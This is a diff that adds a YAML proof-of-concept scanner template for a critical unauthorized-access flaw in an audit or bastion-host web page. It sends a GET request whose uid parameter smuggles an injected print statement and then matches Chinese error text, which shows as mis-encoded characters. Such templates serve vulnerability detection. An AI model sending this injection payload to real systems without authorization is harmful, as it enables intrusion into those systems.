@@ -1,0 +1,18 @@
+name: yaml-poc-qzsec-ris_acm_php-unauthorized_access-CT-530928
+binding: 208774c2-53b6-4cc9-bde6-7b100b27417d
+detail:
+    author: system_user
+    links:
+        - https://blog.csdn.net/weixin_43886632/article/details/117077168
+    vulnerability:
+        id: 285803b6-a73e-40ff-bc18-0d7eebc1ef4c
+        level: critical
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=shterm
+        expression: response.status == 200 && response.body.bcontains(b"±¤ÀÝ»ú") && response.body.bcontains(b"´íÎóµÄid")
+expression: r0()
